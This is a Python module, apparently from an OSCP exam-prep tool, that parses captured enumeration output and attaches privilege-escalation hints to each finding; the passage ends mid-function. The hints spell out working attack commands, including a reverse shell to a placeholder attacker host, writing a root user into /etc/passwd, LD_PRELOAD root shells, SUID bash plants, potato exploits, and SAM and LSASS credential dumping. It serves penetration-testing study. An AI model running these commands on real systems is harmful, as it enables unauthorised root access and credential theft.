"""privesc.py - standalone-machine privilege-escalation evidence parsers.

OSCP+ standalone boxes are 20 pts each (10 initial + 10 privesc). This module
parses the OUTPUT the operator already captured on the target (whoami /priv,
sudo -l, find -perm, ls -la, /etc/crontab, accesschk, icacls, sc qc, wmic,
id, ss/netstat, systemd units, ps aux, winPEAS/linPEAS sections, Procmon CSV)
and emits a finding + Evidence(kind="privesc_vector") per confirmed primitive.

It never touches a target. The tool POINTS; you ACT.

Design rules (same shape as analyzers/keyword.py detectors):
  * module-level doc-file gate (cheat-sheets reproduce every shape below)
  * anchored parsers: a header / prompt line is REQUIRED before rows count
  * `[ \\t]+` for same-line column gaps, never `\\s+` across columns
  * per-file dedupe, line numbers from the FULL text (substring searches
    offset by `text[:base + m.start()].count("\\n") + 1`)
  * every hint is a manual, exam-legal next step. No sqlmap / hydra /
    msfconsole modules / meterpreter / spoofing. msfvenom shell payloads are
    quota-free (only a METERPRETER payload binds the one-target quota).

Per-file context (`ctx`) lets later passes upgrade earlier ones in the SAME
file (writable script + root cron / sudo / systemd = CRITICAL). Cross-file
pairing is the correlator's job via the Evidence facts emitted here.
"""
import os
import re
from bisect import bisect_left
from analyzers import filters, compliance
from analyzers.ingest.evidence import Evidence

CAT = "PRIVESC"
KIND = "privesc_vector"

# quota-free reverse-shell payload used across Windows hints (NOT meterpreter)
_QUOTA_NOTE = "(non-meterpreter payload = quota-free on every target; only a meterpreter payload binds the one-target Metasploit quota)"
_REV_EXE = ("msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATT> LPORT=443 "
            "-f exe -o rev.exe " + _QUOTA_NOTE + " + nc -lvnp 443")
_REV_SVC_EXE = ("msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATT> LPORT=443 "
                "-f exe-service -o rev.exe " + _QUOTA_NOTE + " + nc -lvnp 443")
_ROOTBASH = "cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash"


def _sh(v):
    """shell-escape an operator-controlled value that lands inside '...'."""
    return (v or "").replace("'", "'\\''")


def _wbase(p):
    """basename that understands Windows backslash paths on a Linux host."""
    return (p or "").replace("\\", "/").rstrip("/").rsplit("/", 1)[-1]


# a shell / cmd prompt line: `$ cmd`, `# cmd`, `C:\> cmd`, `PS C:\> cmd`
_PV_PROMPT = re.compile(
    r'^(?:[^\r\n]{0,40}[$#][ \t]+[A-Za-z./\\]|(?:PS[ \t]+)?[A-Za-z]:\\[^\r\n]{0,120}>[ \t]*[A-Za-z.\\])')


def _ev(store, path, line, fact, os_name, user="", host="", **meta):
    """store an Evidence(kind=privesc_vector) record; meta.technique == fact."""
    if store is None:
        return None
    m = {"technique": fact, "os": os_name}
    m.update({k: v for k, v in meta.items() if v not in (None, "", [], {})})
    return store.add(Evidence(kind=KIND, fact=fact, user=user or "", host=host or "",
                              source=path, line=line, meta=m))


_LINPEAS_HDR = re.compile(r'(?m)^[^\r\n]{0,12}(?:╔|═{3,}|\[\+\] )')


# ═══════════════════════════════════════════════════════════════════════════
# D3-08  dangerous supplementary groups (runs FIRST: fills ctx['uid_groups'])
# ═══════════════════════════════════════════════════════════════════════════
_PV_ID_LINE = re.compile(
    r'(?im)^[ \t]*uid=(\d+)\(([\w.\-]+)\)[ \t]+gid=\d+\([\w.\-]+\)[ \t]+groups=([^\r\n]+)$')
_PV_GRP_PAIR = re.compile(r'(\d+)\(([\w.\-]+)\)')
_PV_ETC_GROUP = re.compile(
    r'(?m)^(lxd|lxc|disk|shadow|sudo|wheel|adm|video|kvm|libvirt)(?:d)?:x:\d+:([\w,.\-]+)$')
_PV_CAT_GROUP = re.compile(r'(?im)^[^\r\n]{0,40}\bcat[ \t]+/etc/group\b')
# `$ groups` / `groups bob` prompt line; output on the same line after ':' or
# on the following line as bare tokens.
_PV_GROUPS_CMD = re.compile(
    r'(?im)^(?:[^\r\n]{0,40}[$#][ \t]+)?groups(?:[ \t]+([\w.\-]+))?[ \t]*(?::[ \t]*([^\r\n]*))?$')
_PV_GROUP_TOKENS = re.compile(r'^(?:[\w.\-]+[ \t]+){0,40}[\w.\-]+[ \t]*$')
_DANGEROUS_GROUPS = {
    "lxd": "CRITICAL", "lxc": "CRITICAL", "disk": "HIGH", "shadow": "HIGH",
    "sudo": "HIGH", "wheel": "HIGH", "adm": "MEDIUM", "video": "INFO",
    "kvm": "INFO", "libvirt": "INFO", "libvirtd": "INFO",
}
_LXD_HINT = (
    "lxd group = root via privileged container. Kali: git clone "
    "https://github.com/saghul/lxd-alpine-builder; cd lxd-alpine-builder; sudo ./build-alpine "
    "-> transfer alpine-*.tar.gz -> target: lxc image import ./alpine-*.tar.gz --alias pwn ; "
    "lxc init pwn ignite -c security.privileged=true ; "
    "lxc config device add ignite host disk source=/ path=/mnt/root recursive=true ; "
    "lxc start ignite ; lxc exec ignite /bin/sh -> chroot /mnt/root  "
    "(if `lxd init` was never run: lxd init --auto first)")


def _pass_groups(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_groups", set())

    def emit(group, user, line):
        g = group.rstrip("d") if group in ("libvirtd",) else group
        if g == "docker":
            return                        # keyword.py owns the docker group
        sev = _DANGEROUS_GROUPS.get(g)
        if not sev or (g, user) in seen:
            return
        seen.add((g, user))
        if g in ("lxd", "lxc"):
            detail = f"user {user} is in group '{g}' -> root via privileged LXD container"
            hint = _LXD_HINT
        elif g == "disk":
            detail = f"user {user} is in group 'disk' -> raw block-device read (shadow / root keys)"
            hint = ("find the root device with `df /` then: debugfs /dev/sda1 -> "
                    "`cat /etc/shadow` / `cat /root/.ssh/id_rsa`  |  or `dd if=/dev/sda1 | strings`")
        elif g == "shadow":
            detail = f"user {user} is in group 'shadow' -> /etc/shadow readable"
            hint = ("cat /etc/shadow -> unshadow /etc/passwd shadow.txt > h.txt; "
                    "hashcat -m 1800 h.txt rockyou.txt  (john --format=crypt for $y$ yescrypt)")
        elif g in ("sudo", "wheel"):
            detail = f"user {user} is in group '{g}' (sudo-capable) - needs this user's password"
            hint = (f"if a password for {user} is found ANYWHERE in the loot -> `sudo su -` ; "
                    f"check `sudo -l` first (NOPASSWD rows need no password)")
        elif g == "adm":
            detail = f"user {user} is in group 'adm' -> /var/log readable (creds in auth/web logs)"
            hint = ("grep -iE 'pass|pw|secret' /var/log/auth.log /var/log/syslog "
                    "/var/log/apache2/* /var/log/nginx/* 2>/dev/null | head")
        else:
            detail = f"user {user} is in group '{g}' (device access - low value, note only)"
            hint = None
        report.add(sev, CAT, path, line, detail, hint=hint)
        _ev(store, path, line, f"group_{g}", "linux", user=user, group=g)
        if g in ("sudo", "wheel"):
            _ev(store, path, line, "sudo_group", "linux", user=user, group=g)

    # (A) `id` output - the anchor keyword.py uses for the docker group
    for m in _PV_ID_LINE.finditer(text):
        uid, user, grp_blob = m.group(1), m.group(2), m.group(3)
        if uid == "0":
            continue
        ctx.setdefault("uid", uid)
        ctx.setdefault("user", user)
        for gm in _PV_GRP_PAIR.finditer(grp_blob):
            gname = gm.group(2)
            ctx["uid_groups"].add(gname)
            emit(gname, user, _ln(m))

    # (B) /etc/group rows - filename `group` or a `cat /etc/group` prompt
    base = os.path.basename(path).lower()
    if base == "group" or _PV_CAT_GROUP.search(text):
        for m in _PV_ETC_GROUP.finditer(text):
            gname = m.group(1)
            for u in m.group(2).split(","):
                u = u.strip()
                if u and u != "root":
                    emit(gname, u, _ln(m))
                    if ctx.get("user") == u:
                        ctx["uid_groups"].add(gname)

    # (C) `groups` command output
    lines = text.split("\n")
    for i, ln in enumerate(lines):
        m = _PV_GROUPS_CMD.match(ln)
        if not m:
            continue
        user = m.group(1) or ctx.get("user") or "<current user>"
        out = m.group(2)
        if out is None:
            out = lines[i + 1] if i + 1 < len(lines) else ""
            out_line = i + 2
        else:
            out_line = i + 1
        out = out.strip()
        if not out or not _PV_GROUP_TOKENS.match(out):
            continue
        toks = out.split()
        if not any(t in _DANGEROUS_GROUPS or t == "docker" for t in toks):
            continue
        if m.group(1) is None and toks and ctx.get("user") in (None, toks[0]):
            ctx.setdefault("user", toks[0])
            user = toks[0]
        for t in toks:
            if t in _DANGEROUS_GROUPS:
                if m.group(1) is None or m.group(1) == ctx.get("user"):
                    ctx["uid_groups"].add(t)
                emit(t, user, out_line)


# ═══════════════════════════════════════════════════════════════════════════
# D3-05  world-writable / readable sensitive files (fills ctx['writable'])
# ═══════════════════════════════════════════════════════════════════════════
_PV_LS_ROW = re.compile(
    r'(?im)^([-dls][rwxsStT-]{9})[+.@]?[ \t]+\d+[ \t]+([\w.\-]+)[ \t]+([\w.\-]+)[ \t]+\d+'
    r'[ \t]+\S+[ \t]+\S+[ \t]+\S+[ \t]+(/[^\r\n]+?)(?:[ \t]+->[ \t]+\S+)?[ \t]*$')
_PV_LINPEAS_WRITABLE_HDR = re.compile(
    r'Interesting writable files owned by me or writable by everyone')
_PV_SENSITIVE = re.compile(
    r'^/etc/(?:passwd|shadow|gshadow|sudoers|sudoers\.d/[^/]+|crontab|cron\.d/[^/]+|'
    r'cron\.(?:hourly|daily|weekly|monthly)/[^/]+|anacrontab|ld\.so\.preload|'
    r'ld\.so\.conf(?:\.d/[^/]+)?|environment|profile|bash\.bashrc|profile\.d/[^/]+|'
    r'init\.d/[^/]+|rc\.local|systemd/system/[^/]+|exports|hosts|apt/apt\.conf\.d/[^/]+|'
    r'pam\.d/[^/]+)$|^/(?:usr/)?lib/systemd/system/[^/]+$|^/root/\.ssh/authorized_keys$|'
    r'^/home/[^/]+/\.ssh/authorized_keys$|'
    r'^/usr/(?:local/)?lib/python[\d.]*/(?:dist-packages/|site-packages/)?[^/]+\.py$|'
    r'^/var/spool/cron/crontabs/root$')
_PV_NEVER_REPORT = re.compile(r'^/(?:dev|proc|sys|run|tmp|var/tmp|dev/shm|snap)(?:/|$)')
_PV_INTERESTING_W = re.compile(
    r'^/(?:opt|usr/local|srv|var/www|etc|home/[^/]+|root|usr/lib|usr/share)(?:/|$)')
_SCRIPT_EXT = (".sh", ".py", ".pl", ".rb", ".php")


def _sensitive_hint(p, mode, owner, ctx):
    """(severity, detail, hint) for a writable/readable sensitive path."""
    cu = ctx.get("user") or "<user>"
    if p == "/etc/passwd":
        return ("CRITICAL", "/etc/passwd is WRITABLE -> add a uid-0 user",
                "openssl passwd -1 -salt x Password1 -> echo 'r00t:<hash>:0:0:root:/root:/bin/bash' "
                ">> /etc/passwd; su r00t  (password Password1)")
    if p in ("/etc/shadow", "/etc/gshadow"):
        return ("CRITICAL", f"{p} is WRITABLE -> replace the root hash",
                "openssl passwd -6 Password1 -> edit the root line's hash field; su -  (password Password1)")
    if p.startswith("/etc/sudoers"):
        return ("CRITICAL", f"{p} is WRITABLE -> grant yourself NOPASSWD ALL",
                f"echo '{cu} ALL=(ALL) NOPASSWD:ALL' >> {p}; sudo su -")
    if p.startswith(("/etc/cron", "/etc/anacrontab", "/var/spool/cron")):
        return ("CRITICAL", f"{p} is WRITABLE -> root cron job",
                f"echo '* * * * * root {_ROOTBASH}' >> {p}  (cron.d/crontab format; for a "
                f"cron.{{hourly,daily}} script append the same `cp`/`chmod` line) -> wait -> /tmp/rootbash -p")
    if p == "/etc/ld.so.preload":
        return ("CRITICAL", "/etc/ld.so.preload is WRITABLE -> every SUID run loads your .so",
                "printf '#include <stdio.h>\\n#include <stdlib.h>\\nstatic void inject() "
                "__attribute__((constructor));\\nvoid inject(){setuid(0);system(\"/bin/bash -p\");}' "
                "> /tmp/x.c; gcc -shared -fPIC -o /tmp/x.so /tmp/x.c; echo /tmp/x.so > /etc/ld.so.preload; "
                "sudo --version  (any SUID binary triggers it)")
    if p.startswith("/etc/ld.so.conf"):
        return ("CRITICAL", f"{p} is WRITABLE -> library search path hijack for SUID binaries",
                "add a dir you control to it, drop a .so named like one a SUID binary loads "
                "(ldd <suid>), run `ldconfig` if you can, then execute the SUID binary")
    if "/systemd/system/" in p:
        return ("CRITICAL", f"systemd unit {p} is WRITABLE -> root ExecStart",
                f"edit ExecStart= to `/bin/bash -c \"{_ROOTBASH}\"`; takes effect at the next (re)start / "
                f"timer run, or `sudo systemctl daemon-reload && sudo systemctl restart <unit>` if sudo allows "
                f"-> /tmp/rootbash -p")
    if p.endswith("/authorized_keys"):
        who = "root" if p.startswith("/root/") else p.split("/")[2]
        return ("CRITICAL", f"{p} is WRITABLE -> ssh in as {who}",
                f"ssh-keygen -t ed25519 -f key -N '' (Kali); cat key.pub >> {p}; ssh -i key {who}@<target>")
    if ".py" in p and "/python" in p:
        return ("CRITICAL", f"system python module {p} is WRITABLE -> library hijack",
                f"append `import os;os.system(\"chmod +s /bin/bash\")` to {p}; wait for / trigger any "
                f"root python that imports {os.path.basename(p)[:-3]} (sudo / cron / systemd) -> /bin/bash -p")
    if p.startswith(("/etc/init.d/", "/etc/rc.local")):
        return ("CRITICAL", f"{p} is WRITABLE -> runs as root at boot / service restart",
                f"append `{_ROOTBASH}`; trigger: `sudo service <name> restart` if allowed, else reboot "
                f"(shutdown -r now needs rights) -> /tmp/rootbash -p")
    if p in ("/etc/environment", "/etc/profile", "/etc/bash.bashrc") or p.startswith("/etc/profile.d/"):
        return ("HIGH", f"{p} is WRITABLE -> executes when root logs in interactively",
                f"append `{_ROOTBASH}` to {p}; wait for a root login (check `last`/`w`) -> /tmp/rootbash -p")
    if p.startswith("/etc/pam.d/"):
        return ("CRITICAL", f"{p} is WRITABLE -> PAM auth bypass",
                f"prepend `auth sufficient pam_permit.so` to {p} (su / sshd / login) -> su -")
    if p == "/etc/exports":
        return ("HIGH", "/etc/exports is WRITABLE -> no_root_squash export",
                "add `/ *(rw,no_root_squash)`; needs `exportfs -a` or an nfs restart; then mount from "
                "Kali and drop a SUID bash")
    if p == "/etc/hosts":
        return ("MEDIUM", "/etc/hosts is WRITABLE -> redirect a root-run fetch (wget/curl in cron) to Kali",
                "pair with a cron/systemd job that downloads by hostname")
    if p.startswith("/etc/apt/apt.conf.d/"):
        return ("CRITICAL", f"{p} is WRITABLE -> runs on the next apt invocation as root",
                f"echo 'APT::Update::Pre-Invoke {{\"{_ROOTBASH}\"}};' > {p}  -> wait for apt (cron/unattended-upgrades)")
    return ("HIGH", f"{p} is WRITABLE (sensitive system file)", None)


def _pass_writable(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_writable", set())
    groups = ctx.get("uid_groups", set())

    def record(p, mode):
        ctx["writable"][p] = mode
        if (_PV_INTERESTING_W.match(p) and (mode.startswith("d") or p.endswith(_SCRIPT_EXT))
                and not _PV_SENSITIVE.match(p)):
            fact = "writable_dir" if mode.startswith("d") else "writable_file"
            _ev(store, path, None, fact, "linux", target=p, mode=mode)

    def report_sensitive(p, mode, owner, line):
        if p in seen or _PV_NEVER_REPORT.match(p):
            return
        seen.add(p)
        sev, detail, hint = _sensitive_hint(p, mode, owner, ctx)
        report.add(sev, CAT, path, line, detail, hint=hint)
        _ev(store, path, line, "writable_sensitive", "linux", target=p, mode=mode, owner=owner)

    # (A) ls -la rows with an absolute path
    for m in _PV_LS_ROW.finditer(text):
        mode, owner, group, p = m.group(1), m.group(2), m.group(3), m.group(4).strip()
        if mode[0] == "l" or _PV_NEVER_REPORT.match(p):
            continue
        other_w = mode[8] == "w"
        group_w = mode[5] == "w" and group != "root" and group in groups
        is_sens = bool(_PV_SENSITIVE.match(p))
        if not (other_w or (mode[5] == "w" and group != "root") or p in ("/etc/shadow", "/etc/gshadow")
                or p.endswith("/id_rsa")):
            continue
        line = _ln(m)
        if other_w or group_w:
            record(p, mode)
            if is_sens:
                report_sensitive(p, mode, owner, line)
        elif mode[5] == "w" and group != "root" and is_sens and p not in seen:
            seen.add(p)
            report.add("MEDIUM", CAT, path, line,
                       f"{p} is group-writable ({group}) - privesc if you are in that group",
                       hint=f"id | grep -w {group}  -> if yes, treat as writable (see /etc/passwd|shadow|sudoers hints)")
            _ev(store, path, line, "writable_group", "linux", target=p, mode=mode, group=group)
        if p in ("/etc/shadow", "/etc/gshadow") and mode[7] == "r" and (p + ":r") not in seen:
            seen.add(p + ":r")
            report.add("CRITICAL", CAT, path, line,
                       f"{p} is world-READABLE -> crack the root hash offline",
                       hint="cat /etc/shadow; unshadow /etc/passwd shadow.txt > h.txt; hashcat -m 1800 h.txt "
                            "rockyou.txt  (john --format=crypt h.txt for $y$ yescrypt)")
            _ev(store, path, line, "shadow_readable", "linux", target=p, mode=mode)
        if p.endswith("/id_rsa") and mode[7] == "r":
            ctx.setdefault("readable_keys", set()).add(p)

    # (B) linpeas writable list (already verified by linpeas: fill ctx for ALL)
    for hm in _PV_LINPEAS_WRITABLE_HDR.finditer(text):
        start = text.find("\n", hm.end()) + 1
        if start <= 0:
            break
        lines = text[start:start + 60000].split("\n")
        base_line = _ln(start)
        for i, ln in enumerate(lines[:500]):
            s = ln.strip()
            if not s or s.startswith(("╚", "https://")):
                continue
            if "╔" in ln or "═══" in ln:
                break
            if not s.startswith("/") or " " in s:
                continue
            if _PV_NEVER_REPORT.match(s):
                continue
            record(s, "linpeas")
            if _PV_SENSITIVE.match(s):
                report_sensitive(s, "linpeas", "?", base_line + i)


# ═══════════════════════════════════════════════════════════════════════════
# D3-01  whoami /priv + winPEAS token privileges
# ═══════════════════════════════════════════════════════════════════════════
_PV_WHOAMI_HDR = re.compile(r'(?im)^[ \t]*Privilege Name[ \t]+Description[ \t]+State[ \t]*$')
# NB: whoami pads each column to its LONGEST value, so the longest privilege
# name / description is followed by a SINGLE space - `[ \t]{2,}` gaps would
# drop exactly the SeImpersonatePrivilege row. Header anchor + `$` keep FPs out.
_PV_WHOAMI_ROW = re.compile(
    r'(?im)^[ \t]*(Se[A-Za-z]{3,40}Privilege)[ \t]+[^\r\n]*?[ \t]+(Enabled|Disabled)[ \t]*$')
_PV_WINPEAS_PRIV = re.compile(
    r'(?im)^[ \t]*(Se[A-Za-z]{3,40}Privilege):[ \t]*(DISABLED|(?:SE_PRIVILEGE_[A-Z_]+(?:,[ \t]*)?)+)[ \t]*$')
_PV_WIN_USER = re.compile(r'(?im)^([\w.\-]+\\[\w.\-$]+)[ \t]+S-1-5-21-[\d\-]+[ \t]*$')
_PRIV_SEV = {
    "SeImpersonatePrivilege": "CRITICAL", "SeAssignPrimaryTokenPrivilege": "CRITICAL",
    "SeBackupPrivilege": "CRITICAL", "SeCreateTokenPrivilege": "CRITICAL",
    "SeTcbPrivilege": "CRITICAL", "SeRestorePrivilege": "HIGH",
    "SeTakeOwnershipPrivilege": "HIGH", "SeManageVolumePrivilege": "HIGH",
    "SeLoadDriverPrivilege": "HIGH", "SeDebugPrivilege": "MEDIUM",
}
_POTATO_HINT = (
    "Win10/2016/2019: PrintSpoofer64.exe -i -c cmd (needs Print Spooler running: `sc query spooler`)  |  "
    "all versions incl. 2022/11: GodPotato-NET4.exe -cmd \"cmd /c whoami\" then "
    "GodPotato-NET4.exe -cmd \"C:\\Users\\<u>\\rev.exe\"  |  older (<=2016 w/ DCOM): "
    "JuicyPotato.exe -l 1337 -p C:\\Users\\<u>\\rev.exe -t * -c {CLSID}  |  rev.exe = " + _REV_EXE)
_PRIV_HINT = {
    "SeImpersonatePrivilege": _POTATO_HINT,
    "SeAssignPrimaryTokenPrivilege": _POTATO_HINT,
    "SeBackupPrivilege": (
        "reg save HKLM\\SAM sam.hive; reg save HKLM\\SYSTEM system.hive; reg save HKLM\\SECURITY security.hive; "
        "impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL -> "
        "impacket-psexec -hashes :<NT> Administrator@<target>  |  read ANY file: "
        "robocopy /b C:\\Users\\Administrator\\Desktop C:\\Temp proof.txt  |  "
        "on a DC: diskshadow + robocopy /b ntds.dit -> secretsdump -ntds ... LOCAL"),
    "SeRestorePrivilege": (
        "write any file / registry key. Overwriting C:\\Windows\\System32\\utilman.exe with cmd.exe is "
        "destructive - prefer: reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath "
        "/t REG_EXPAND_SZ /d C:\\Temp\\rev.exe /f then `sc start <svc>` (or reboot: shutdown /r /t 0 "
        "if SeShutdownPrivilege) ; rev.exe = " + _REV_SVC_EXE),
    "SeTakeOwnershipPrivilege": (
        "takeown /F C:\\Windows\\System32\\config\\SAM (then icacls ... /grant %USERNAME%:F; copy out + "
        "secretsdump LOCAL) or target a SYSTEM service binary: takeown /F <bin>; icacls <bin> /grant "
        "%USERNAME%:F; copy /Y rev.exe <bin>; sc stop <svc>; sc start <svc>"),
    "SeManageVolumePrivilege": (
        "SeManageVolumeExploit.exe -> grants full control on C:\\ -> write "
        "C:\\Windows\\System32\\wbem\\tzres.dll (DllMain = rev shell / net user add) then run `systeminfo` "
        "to trigger the load as SYSTEM"),
    "SeLoadDriverPrivilege": (
        "vulnerable-driver load (Capcom.sys / EoPLoadDriver) - grey-area on the exam; note only unless "
        "the box clearly intends it"),
    "SeDebugPrivilege": (
        "dump LSASS without mimikatz on disk: rundll32 C:\\windows\\System32\\comsvcs.dll, MiniDump "
        "<lsass-pid> C:\\Temp\\lsass.dmp full  -> parse offline on Kali (pypykatz lsa minidump lsass.dmp)"),
}
_PRIV_IGNORE = {"SeChangeNotifyPrivilege", "SeIncreaseWorkingSetPrivilege", "SeUndockPrivilege",
                "SeTimeZonePrivilege", "SeShutdownPrivilege"}


def _pass_token_privs(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_privs", set())
    rows = []
    if _PV_WHOAMI_HDR.search(text):
        for m in _PV_WHOAMI_ROW.finditer(text):
            rows.append((m.group(1), "Enabled" if m.group(2).lower() == "enabled" else "Disabled", _ln(m)))
    wp = list(_PV_WINPEAS_PRIV.finditer(text))
    if len(wp) >= 2:
        for m in wp:
            state = "Disabled" if m.group(2).upper() == "DISABLED" else "Enabled"
            rows.append((m.group(1), state, _ln(m)))
    if not rows:
        return
    um = _PV_WIN_USER.search(text)
    user = um.group(1) if um else ""
    for name, state, line in rows:
        if name == "SeShutdownPrivilege":
            if "shutdown" not in seen:
                seen.add("shutdown")
                ctx["shutdown_priv"] = True
                _ev(store, path, line, "se_shutdown", "windows", user=user, target=name, state=state)
            continue
        if name in _PRIV_IGNORE or name in seen:
            continue
        sev = _PRIV_SEV.get(name)
        if not sev:
            continue
        seen.add(name)
        detail = f"token privilege {name} ({sev} primitive)"
        if state == "Disabled":
            detail += " (State: Disabled - the tool enables it)"
        if name in ("SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"):
            detail = f"{name} held -> Potato/PrintSpoofer -> SYSTEM" + (
                " (State: Disabled - the tool enables it)" if state == "Disabled" else "")
        report.add(sev, CAT, path, line, detail, hint=_PRIV_HINT.get(name))
        _ev(store, path, line, "se_" + name[2:-9].lower(), "windows", user=user,
            target=name, state=state, sev=sev)


# ═══════════════════════════════════════════════════════════════════════════
# D3-02  sudo -l full-block parser
# ═══════════════════════════════════════════════════════════════════════════
_PV_SUDO_HDR = re.compile(
    r'(?im)^[ \t]*(?:Matching Defaults entries for (\S+) on \S+:|'
    r'User (\S+) may run the following commands on \S+:)[ \t]*$')
_PV_SUDO_LDPRELOAD = re.compile(
    r'(?i)\benv_keep\s*\+?=\s*"?[^\r\n"]*\bLD_(?:PRELOAD|LIBRARY_PATH)\b')
_PV_SUDO_ROW = re.compile(r'(?im)^[ \t]*\(([^)\r\n]{1,80})\)[ \t]+((?:NOPASSWD:|SETENV:|[ \t])*)([^\r\n]+?)[ \t]*$')
_PV_SUDO_NOT_ROOT = re.compile(
    r'(?im)^[ \t]*\(\s*ALL\s*(?::\s*ALL\s*)?,\s*!root\s*\)\s*(?:NOPASSWD:\s*)?([^\r\n]{1,200})$')
_PV_SUDO_ALL = re.compile(
    r'(?im)^[ \t]*\(\s*(?:ALL|root)\s*(?::\s*ALL\s*)?\)\s*(NOPASSWD:\s*)?ALL[ \t]*$')
_PV_SUDO_SETENV = re.compile(
    r'(?im)^[ \t]*\(([^)\r\n]{1,80})\)[ \t]+(?:NOPASSWD:[ \t]*)?SETENV:[ \t]*(?:NOPASSWD:[ \t]*)?'
    r'(/\S+(?:[ \t]+\S+)*)')
_PV_SUDO_SCRIPT = re.compile(
    r'(?im)^[ \t]*\(([^)\r\n]{1,80})\)[ \t]+(?:NOPASSWD:[ \t]*)?(?:SETENV:[ \t]*)?(?:NOPASSWD:[ \t]*)?'
    r'(?:/\S*(?:python[\d.]*|perl|ruby|bash|sh|php|node)[ \t]+(?:-\w[ \t]+)*)?'
    r'((?:/opt|/home|/usr/local|/srv|/var|/tmp|/root)/\S+|/\S+\.(?:sh|py|pl|rb|php))'
    r'(?:[ \t]+[^\r\n]*)?$')
_PV_SUDO_VERSION = re.compile(r'(?i)Sudo version (\d+)\.(\d+)\.(\d+)')
_LDPRELOAD_HINT = (
    "cat > /tmp/shell.c <<'EOF'\\n#include <stdio.h>\\n#include <sys/types.h>\\n#include <stdlib.h>\\n"
    "void _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash -p\");}\\nEOF ; "
    "gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c ; "
    "sudo LD_PRELOAD=/tmp/shell.so {cmd}")


def _pass_sudo(text, path, report, store, ctx, _ln):
    hdr = _PV_SUDO_HDR.search(text)
    if not hdr:
        return
    sudo_user = hdr.group(2) or hdr.group(1) or ""
    if sudo_user == "root":
        return
    base = hdr.start()
    blk = text[base: base + 6000]

    def bl(m):
        return _ln(base + m.start())

    seen = ctx.setdefault("_seen_sudo", set())
    rows = [(m.group(1).strip(), m.group(2), m.group(3).strip(), bl(m))
            for m in _PV_SUDO_ROW.finditer(blk)]
    for _runas, _flags, _cmd, _l in rows:
        if _cmd and _cmd != "ALL" and ("root" in _runas.lower() or _runas.strip().upper() == "ALL"):
            ctx["root_cmds"].append(("sudo_row", _cmd, _l))
    vm = _PV_SUDO_VERSION.search(text)
    ver = tuple(int(x) for x in vm.groups()) if vm else None

    # (a) env_keep LD_PRELOAD + at least one command row
    lp = _PV_SUDO_LDPRELOAD.search(blk)
    if lp and rows and ("sudo_ld_preload", "") not in seen:
        seen.add(("sudo_ld_preload", ""))
        first = rows[0][2].split()[0] if rows[0][2] and rows[0][2] != "ALL" else "<any allowed cmd>"
        report.add("CRITICAL", CAT, path, bl(lp),
                   f"sudo env_keep LD_PRELOAD -> root via any sudo-able command (first: {first})",
                   hint=_LDPRELOAD_HINT.replace("{cmd}", first))
        _ev(store, path, bl(lp), "sudo_ld_preload", "linux", user=sudo_user, cmd=first)

    # (b) (ALL, !root) -> CVE-2019-14287
    for m in _PV_SUDO_NOT_ROOT.finditer(blk):
        cmd = m.group(1).strip()
        if ("sudo_not_root", cmd) in seen:
            continue
        seen.add(("sudo_not_root", cmd))
        vuln = ver is not None and ver < (1, 8, 28)
        sev = "CRITICAL" if vuln else "HIGH"
        vtxt = (f" - Sudo {'.'.join(map(str, ver))} < 1.8.28 = VULNERABLE" if vuln
                else " - check `sudo --version` (< 1.8.28 vulnerable)")
        report.add(sev, CAT, path, bl(m),
                   f"sudo (ALL, !root) {cmd} -> CVE-2019-14287 uid -1 bypass{vtxt}",
                   hint=f"sudo -u#-1 {cmd.split()[0] if cmd else '/bin/bash'}  (also `sudo -u#4294967295 ...`)")
        _ev(store, path, bl(m), "sudo_not_root", "linux", user=sudo_user, cmd=cmd,
            sudo_version=".".join(map(str, ver)) if ver else "")

    # (c) (ALL : ALL) ALL / (root) NOPASSWD: ALL
    for m in _PV_SUDO_ALL.finditer(blk):
        key = ("sudo_all", "nopasswd" if m.group(1) else "pw")
        if key in seen:
            continue
        seen.add(key)
        if m.group(1):
            report.add("CRITICAL", CAT, path, bl(m),
                       f"sudo ALL NOPASSWD for {sudo_user} -> root",
                       hint="sudo su -   (or: sudo -i)")
            _ev(store, path, bl(m), "sudo_all_nopasswd", "linux", user=sudo_user)
        else:
            report.add("HIGH", CAT, path, bl(m),
                       f"full sudo for {sudo_user}, password required - reuse any plaintext found for this user",
                       hint=f"sudo su -   (password of {sudo_user}: check CRED PAIRS / history / configs)")
            _ev(store, path, bl(m), "sudo_all_pw", "linux", user=sudo_user)

    # (d) SETENV rows
    for m in _PV_SUDO_SETENV.finditer(blk):
        cmd = m.group(2).strip()
        if ("sudo_setenv", cmd) in seen:
            continue
        seen.add(("sudo_setenv", cmd))
        extra = ""
        toks = cmd.split()
        if any("python" in t for t in toks[:1]) and len(toks) > 1:
            extra = (f"  |  python: drop /tmp/<imported-module>.py then sudo PYTHONPATH=/tmp {cmd}")
        elif toks and "perl" in toks[0]:
            extra = "  |  perl: sudo PERL5LIB=/tmp " + cmd
        report.add("CRITICAL", CAT, path, bl(m),
                   f"sudo SETENV: {cmd} -> env injection (LD_PRELOAD works even without env_keep)",
                   hint=_LDPRELOAD_HINT.replace("{cmd}", cmd) + extra)
        _ev(store, path, bl(m), "sudo_setenv", "linux", user=sudo_user, cmd=cmd)
        ctx["root_cmds"].append(("sudo_setenv", cmd, bl(m)))

    # (e) user-space script rows
    for m in _PV_SUDO_SCRIPT.finditer(blk):
        spath = m.group(2).strip()
        full = blk[m.start():m.end()].strip()
        if ("sudo_script", spath) in seen:
            continue
        if any(k[0] == "sudo_setenv" and spath in k[1] for k in seen):
            continue                                  # SETENV CRITICAL already covers this row
        seen.add(("sudo_script", spath))
        cmd_tail = full.split(")", 1)[1].strip()
        for pfx in ("NOPASSWD:", "SETENV:"):
            cmd_tail = cmd_tail.replace(pfx, "").strip()
        ctx["root_cmds"].append(("sudo_script", cmd_tail, bl(m)))
        wr = ctx["writable"].get(spath) or ctx["writable"].get(os.path.dirname(spath))
        if wr:
            where = spath if spath in ctx["writable"] else os.path.dirname(spath)
            report.add("CRITICAL", CAT, path, bl(m),
                       f"sudo-able script {spath} and {where} is WRITABLE -> root",
